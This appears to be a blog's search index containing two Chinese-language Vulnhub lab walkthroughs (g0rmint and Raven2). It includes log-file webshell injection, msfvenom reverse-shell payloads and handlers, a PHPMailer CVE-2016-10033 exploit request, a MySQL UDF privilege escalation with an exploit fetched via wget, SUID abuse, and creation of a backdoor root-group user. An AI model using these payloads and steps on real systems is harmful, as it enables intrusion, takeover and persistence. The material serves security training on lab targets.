<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[g0rmint渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2Fg0rmint%2F</url>
    <content type="text"><![CDATA[前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是十分狗血，莫名其妙的问题一大堆 渗透测试主机发现netdiscover:netdiscover -r 192.168.64.0/24 端口扫描 仅开放22与80端口，看样子需要从web层面进行渗透 Web信息收集（1）目录扫描 扫描器发现，网站根目录下存在robots.txt，打开提示/g0rmint/ 继续使用扫描器发现：login.php 介绍kali下的目录扫描工具:dirb dirb http://........... （2）页面信息 经过尝试并没有发现漏洞点，查看源码，发现一段提示: 这里相当无语，我的靶机里并没有这一行代码，但网络上的教程中是显示有的 访问后仍然404，但用扫描器发现了一些信息 dirb http://192.168.64.144/g0rmint/s3cretbackupdirect0ry/ 访问info.php，得到信息：backup.zip；成功下载获取源码 代码审计 想着登录到后台，从db.sql中找到了一条信息 1INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES (1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');` MD5解密=&gt;demo 但是发现无法登录，可能是该信息是最原始的密码。 查看reset.php: 密码是截取gmdate()函数生成的日期的前20位，再先后加密得到的 而修改密码需要提供账户名和邮箱名，使用db.sql中的信息失败 经网上教程提醒，全局搜索email，在某个css文件中查找到了这条信息： 修改登录，最终成功登录进入后台： getshell发现后台并没有什么利用点，继续审查代码 在login.php中可以看到 1234567891011121314151617181920212223&lt;?phpinclude_once('config.php');if (isset($_POST['submit'])) &#123; // If form is submitted $email = $_POST['email']; $pass = md5($_POST['pass']); $sql = $pdo-&gt;prepare("SELECT * FROM g0rmint WHERE email = :email AND pass = :pass"); $sql-&gt;bindParam(":email", $email); $sql-&gt;bindParam(":pass", $pass); $row = $sql-&gt;execute(); $result = $sql-&gt;fetch(PDO::FETCH_ASSOC); if (count($result) &gt; 1) &#123; session_start(); $_SESSION['username'] = $result['username']; header('Location: index.php'); exit(); &#125; else &#123; $log = $email; $reason = "Failed login attempt detected with email: "; addlog($log, $reason); &#125;&#125;?&gt; 其中addlog()定义位于config.php: 1234567891011121314function addlog($log, $reason) &#123; $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php"; if (file_exists($myFile)) &#123; $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; else &#123; $fh = fopen($myFile, 'w'); fwrite($fh, file_get_contents("dummy.php") . "&lt;br&gt;\n"); fclose($fh); $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; fclose($fh);&#125; 可见，当登录失败时，email信息将会被写入到php文件中，即可写入一句话，成功获取webshell 提权查看系统信息 12uname -acat /proc/version 版本信息为：Ubuntu 16.04，存在一种本地提权的方法 参考文章： Ubuntu16.04 本地提权漏洞复测过程 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 这里又是一个坑点，我无论用何种exp，都会提醒各种错误，这个过程花了一个上午，最终还不知道是怎么成功的…但不管怎么说，这几种exp在webshell的虚拟终端是无法执行成功的，需要反弹shell 反弹shell此处给出本例使用过的两种通过metasploit反弹的方式 二进制文件 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf 123456msfconsoleuse exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.64.131set lport 4444exploit PHP文件 1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php 12345use exploit/multi/handlerset payload php/meterpreter_reverse_tcpset lhost 192.168.64.131set lport 4444exploit 由于目标服务器没有gcc，于是在本地Linux系统中生成exp： 1gcc -c exp.c -o exp 将exp上传至目标服务器中，在msf shell中执行，成功提权： 在/root/目录下获取到flag 至此，渗透实验基本完成。 我这里额外添加了一个普通用户，并将它加入到管理员和sudo组 12345useradd hackerpasswd hackerusermod -s /bin/bash hackerusermod -g root hackerusermod -aG sudo hacker 这里因为在msf shell中，不能顺利的修改文件，这里没有完全将普通用户提升为root权限。 12id hackeruid=1001(hacker) gid=0(root) groups=0(root),27(sudo) 杂记 这个靶机因为提权exp的问题耗费了太多的时间精力，还专门去下了一个相同版本的Ubuntu来gcc编译，然后……生成的exp仍然不行 但这个过程中利用到了更换Linux内核，有必要在这里记录一下 uname -r 查看系统默认内核 apt-cache search linux 查看可获取的内核 sudo apt-get install linux-headers-4.4.0-62-generic linux-image-4.4.0-62-generic 安装所需要版本的内核，注意:这一步需要下载两个东西，”headers”和”image”，不能只安装其中一个 sudo gedit /boot/grub/grub.cfg 修改内核配置信息 保存后重启即可 参考文章: 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 ubuntu如何安装或更换内核 Ubuntu下更换内核详细步骤（亲测有效） 参考文章 记一次在实战靶机中使用SearchSploit的总结 Vulnhub-g0rmint 带妹玩转Vulnhub【二】 msf生成常用payload 记一次在实战靶机中使用SearchSploit的总结]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raven2渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FRaven2%2F</url>
    <content type="text"><![CDATA[前言 难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞 渗透信息收集netdiscover -r 192.168.64.0/24 =&gt; 192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)| 2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)| 256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)|_ 256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Raven Security111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 48650/tcp status|_ 100024 1 53215/udp statusMAC Address: 00:0C:29:B2:C8:AD (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel dirb 192.168.64.148 =&gt; /vendor/ /wordpress/ 其中wordpress无法正常打开，vendor存在目录遍历，并发现phpmailer 5.2.16，存在漏洞 GETSHELLmsf：searchsploit phpmailer 选择python那个脚本，修改exp配置： 修改target为靶机的ip，利用文件为/contact.php 修改后门文件路径，默认的用不了 修改反弹shell的ip与端口 这里当然可以手工利用，抓包并向contact.php文件post数据： 1234567891011121314POST /contact.php HTTP/1.1Host: 192.168.64.148Content-Length: 153Accept: text/html, */*; q=0.01Origin: http://192.168.64.148X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.64.148/contact.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeaction=submit&amp;name=&lt;?php phpinfo();?&gt;&amp;email="anarcoder\" -OQueueDirectory=/tmp -X/var/www/html/test.php server" @protonmail.com&amp;subject=123&amp;message=Pwned 提交或执行后，在kali上成功获取到反弹的shell，再使用python创建一个虚拟终端： python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; udf提权发现存在mysql进程，尝试udf提权： 先在kali中下载exp并编译下来： 1234wget https://www.exploit-db.com/download/1518#下载expmv ./1518 ./1518.c gcc -g -c 1518.cgcc -g -shared -o raptor_udf.so 1518.o -lc 在kali下开启Apache服务：/etc/init.d/apache2 start 将编译器下来的raptor_udf.so移动到/html/，在目标服务器/tmp下执行wget http://192.168.64.131:8080/raptor_udf.so 目标服务器下/usr/lib/mysql/plugin中不具备权限，无法直接将文件直接拷贝到该文件夹中，需要进入数据库中操作，在数据库中导入和导出文件： 12345678910111213141516171819202122232425262728293031323334353637mysql&gt; use mysql;mysql&gt; create table foo(data blob);create table foo(data blob);Query OK, 0 rows affected (0.04 sec)mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));Query OK, 1 row affected (0.02 sec)mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;Query OK, 1 row affected (0.01 sec)mysql&gt; create function do_system returns string soname &apos;raptor_udf.so&apos;;create function do_system returns string soname &apos;raptor_udf.so&apos;;Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from mysql.func;select * from mysql.func;+-----------+-----+---------------+----------+| name | ret | dl | type |+-----------+-----+---------------+----------+| do_system | 0 | raptor_udf.so | function |+-----------+-----+---------------+----------+1 row in set (0.00 sec)mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);select do_system(&apos;chmod u+s /usr/bin/find&apos;);+--------------------------------------+| do_system(&apos;chmod u+s /usr/bin/find&apos;) |+--------------------------------------+| NULL |+--------------------------------------+1 row in set (0.01 sec) 命令执行： 123touch foofind foo -exec 'whoami' \;find foo -exec '/bin/sh' \; 参考文章 Web安全 — CVE-2016-10033漏洞（phpmailer任意代码执行） Raven2渗透实战 MySQL 4.x / 5.0（Linux） - 用户定义函数（UDF）动态库]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
</search>
